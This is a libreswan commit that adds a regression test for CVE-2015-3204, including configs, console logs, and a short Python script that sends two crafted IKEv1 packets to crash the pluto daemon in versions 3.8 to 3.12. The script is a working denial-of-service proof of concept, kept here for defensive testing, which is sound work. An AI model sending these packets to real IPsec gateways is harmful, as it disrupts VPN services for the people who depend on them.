libreswan__libreswan
commit 4bf939f248ef56c2a03a418cbe2543ac7a40a7ea
Author:     Paul Wouters <pwouters@redhat.com>
AuthorDate: Sun May 24 20:32:02 2015 -0400
Commit:     Paul Wouters <pwouters@redhat.com>
CommitDate: Mon Jun 1 09:42:35 2015 -0400

    testing: testcase for CVE-2015-3204

diff --git a/testing/pluto/TESTLIST b/testing/pluto/TESTLIST
index 0bcf236245..8f8dd8bd8e 100644
--- a/testing/pluto/TESTLIST
+++ b/testing/pluto/TESTLIST
@@ -24,6 +24,8 @@ kvmplutotest	basic-pluto-07	good
 
 kvmplutotest	netkey-audit-01	good
 
+kvmplutotest	ikev1-01-fuzzer	good
+
 #################################################################
 # IKEv2 tests
 #################################################################
diff --git a/testing/pluto/ikev1-01-fuzzer/cve-2015-3204.py b/testing/pluto/ikev1-01-fuzzer/cve-2015-3204.py
new file mode 100755
index 0000000000..7c6d187375
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/cve-2015-3204.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python
+"""
+Denial of Service against Libreswan 3.8 to 3.12
+by Javantea
+May 14, 2015
+
+Found using my IKEv1 fuzzer.
+"""
+
+import socket
+from binascii import unhexlify
+
+HOST = '192.1.2.23'
+PORT = 500
+
+# jam_str() test
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+data = unhexlify('b9ce3eefc8b661dd00000000000000000110020000000000000000580000003c00000001ffffffff00000000010100010000002801010000800b0001000c00040001518080010007800e0100800300038002000280040005')
+s.sendto(data, (HOST, PORT))
+
+# process_packet_tail() test
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+data = unhexlify('b9ce3eefc8b661dd00000000000000000f10020000000000000000580000003c000000010000000100000030010100010000002801010000800b0001000c00040001518080010007800e0100800300038002000280040005')
+s.sendto(data, (HOST, PORT))
+
diff --git a/testing/pluto/ikev1-01-fuzzer/description.txt b/testing/pluto/ikev1-01-fuzzer/description.txt
new file mode 100644
index 0000000000..6a16841a1f
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/description.txt
@@ -0,0 +1,8 @@
+This uses a basic IKEv1 PSK setup, and then sends known broken
+and malicious packets from the IKE fuzzer by Javantea <jvoss@altsci.com>
+
+These packets are IKEv1 I1 packets of "west" being sent to "east"
+
+libreswan-3.8 up to 3.12 would crash on these packets. This issue is
+known as CVE-2015-3204
+
diff --git a/testing/pluto/ikev1-01-fuzzer/east.conf b/testing/pluto/ikev1-01-fuzzer/east.conf
new file mode 100644
index 0000000000..ec5955a698
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/east.conf
@@ -0,0 +1,16 @@
+# /etc/ipsec.conf - Libreswan IPsec configuration file
+
+version 2.0
+
+config setup
+	# put the logs in /tmp for the UMLs, so that we can operate
+	# without syslogd, which seems to break on UMLs
+	plutostderrlog=/tmp/pluto.log
+	plutodebug=all
+	plutorestartoncrash=false
+	dumpdir=/tmp
+	protostack=netkey
+	nat_traversal=yes
+	virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:!192.0.2.0/24,%v6:!2001:db8:0:2::/64
+
+include	/testing/baseconfigs/all/etc/ipsec.d/ipsec.conf.common
diff --git a/testing/pluto/ikev1-01-fuzzer/east.console.txt b/testing/pluto/ikev1-01-fuzzer/east.console.txt
new file mode 100644
index 0000000000..16e18465ff
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/east.console.txt
@@ -0,0 +1,71 @@
+/testing/guestbin/swan-prep
+east #
+ ipsec setup start
+[ 00.00] IPv4 over IPsec tunneling driver
+Redirecting to: systemctl start ipsec.service
+east #
+ /testing/pluto/bin/wait-until-pluto-started
+east #
+ ipsec auto --add westnet-eastnet
+002 added connection description "westnet-eastnet"
+east #
+ echo "initdone"
+initdone
+east #
+ ipsec look
+east NOW
+XFRM state:
+XFRM policy:
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket out priority 0 ptype main 
+src 0.0.0.0/0 dst 0.0.0.0/0 
+	socket in priority 0 ptype main 
+XFRM done
+IPSEC mangle TABLES
+NEW_IPSEC_CONN mangle TABLES
+ROUTING TABLES
+default via 192.1.2.254 dev eth1 
+169.254.0.0/16 dev eth0  scope link  metric 1002 
+169.254.0.0/16 dev eth1  scope link  metric 1003 
+169.254.0.0/16 dev eth2  scope link  metric 1004 
+192.0.1.0/24 via 192.1.2.45 dev eth1 
+192.0.2.0/24 dev eth0  proto kernel  scope link  src 192.0.2.254 
+192.1.2.0/24 dev eth1  proto kernel  scope link  src 192.1.2.23 
+192.9.2.0/24 dev eth2  proto kernel  scope link  src 192.9.2.23 
+NSS_CERTIFICATES
+Certificate Nickname                                         Trust Attributes
+                                                             SSL,S/MIME,JAR/XPI
+east #
+east #
+ if [ -n "`ls /tmp/core* 2>/dev/null`" ]; then echo CORE FOUND; mv /tmp/core* OUTPUT/; fi
+east #
+ if [ -f /sbin/ausearch ]; then ausearch -r -m avc -ts recent ; fi
+
diff --git a/testing/pluto/ikev1-01-fuzzer/east.secrets b/testing/pluto/ikev1-01-fuzzer/east.secrets
new file mode 100644
index 0000000000..c6b04cdbcd
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/east.secrets
@@ -0,0 +1 @@
+@east @west : PSK "geheim"
diff --git a/testing/pluto/ikev1-01-fuzzer/eastinit.sh b/testing/pluto/ikev1-01-fuzzer/eastinit.sh
new file mode 100755
index 0000000000..452e5df523
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/eastinit.sh
@@ -0,0 +1,5 @@
+/testing/guestbin/swan-prep
+ipsec setup start
+/testing/pluto/bin/wait-until-pluto-started
+ipsec auto --add westnet-eastnet
+echo "initdone"
diff --git a/testing/pluto/ikev1-01-fuzzer/final.sh b/testing/pluto/ikev1-01-fuzzer/final.sh
new file mode 100755
index 0000000000..1f2f5b28b6
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/final.sh
@@ -0,0 +1,7 @@
+ipsec look
+: ==== cut ====
+ipsec auto --status
+: ==== tuc ====
+if [ -n "`ls /tmp/core* 2>/dev/null`" ]; then echo CORE FOUND; mv /tmp/core* OUTPUT/; fi
+if [ -f /sbin/ausearch ]; then ausearch -r -m avc -ts recent ; fi
+: ==== end ====
diff --git a/testing/pluto/ikev1-01-fuzzer/west.conf b/testing/pluto/ikev1-01-fuzzer/west.conf
new file mode 100644
index 0000000000..fa250ebe84
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/west.conf
@@ -0,0 +1,16 @@
+# /etc/ipsec.conf - Libreswan IPsec configuration file
+
+version 2.0
+
+config setup
+	# put the logs in /tmp for the UMLs, so that we can operate
+	# without syslogd, which seems to break on UMLs
+	plutostderrlog=/tmp/pluto.log
+	plutodebug=all
+	plutorestartoncrash=false
+	dumpdir=/tmp
+	nat_traversal=yes
+	virtual_private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:!192.0.1.0/24,%v6:!2001:db8:0:1::/64
+	protostack=netkey
+
+# no conns loaded or started
diff --git a/testing/pluto/ikev1-01-fuzzer/west.console.txt b/testing/pluto/ikev1-01-fuzzer/west.console.txt
new file mode 100644
index 0000000000..ac76b18ebf
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/west.console.txt
@@ -0,0 +1,32 @@
+/testing/guestbin/swan-prep
+west #
+ echo "initdone"
+initdone
+west #
+ ./cve-2015-3204.py
+west #
+ echo done
+done
+west #
+ ipsec look
+west NOW
+IPSEC mangle TABLES
+NEW_IPSEC_CONN mangle TABLES
+ROUTING TABLES
+default via 192.1.2.254 dev eth1 
+169.254.0.0/16 dev eth0  scope link  metric 1002 
+169.254.0.0/16 dev eth1  scope link  metric 1003 
+169.254.0.0/16 dev eth2  scope link  metric 1004 
+192.0.1.0/24 dev eth0  proto kernel  scope link  src 192.0.1.254 
+192.0.2.0/24 via 192.1.2.23 dev eth1 
+192.1.2.0/24 dev eth1  proto kernel  scope link  src 192.1.2.45 
+192.9.4.0/24 dev eth2  proto kernel  scope link  src 192.9.4.45 
+NSS_CERTIFICATES
+Certificate Nickname                                         Trust Attributes
+                                                             SSL,S/MIME,JAR/XPI
+west #
+west #
+ if [ -n "`ls /tmp/core* 2>/dev/null`" ]; then echo CORE FOUND; mv /tmp/core* OUTPUT/; fi
+west #
+ if [ -f /sbin/ausearch ]; then ausearch -r -m avc -ts recent ; fi
+
diff --git a/testing/pluto/ikev1-01-fuzzer/west.secrets b/testing/pluto/ikev1-01-fuzzer/west.secrets
new file mode 100644
index 0000000000..f3dd5a559c
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/west.secrets
@@ -0,0 +1 @@
+@west @east : PSK "geheim"
diff --git a/testing/pluto/ikev1-01-fuzzer/westinit.sh b/testing/pluto/ikev1-01-fuzzer/westinit.sh
new file mode 100755
index 0000000000..9a42283fe0
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/westinit.sh
@@ -0,0 +1,2 @@
+/testing/guestbin/swan-prep
+echo "initdone"
diff --git a/testing/pluto/ikev1-01-fuzzer/westrun.sh b/testing/pluto/ikev1-01-fuzzer/westrun.sh
new file mode 100755
index 0000000000..6cd3d7df98
--- /dev/null
+++ b/testing/pluto/ikev1-01-fuzzer/westrun.sh
@@ -0,0 +1,2 @@
+./cve-2015-3204.py
+echo done
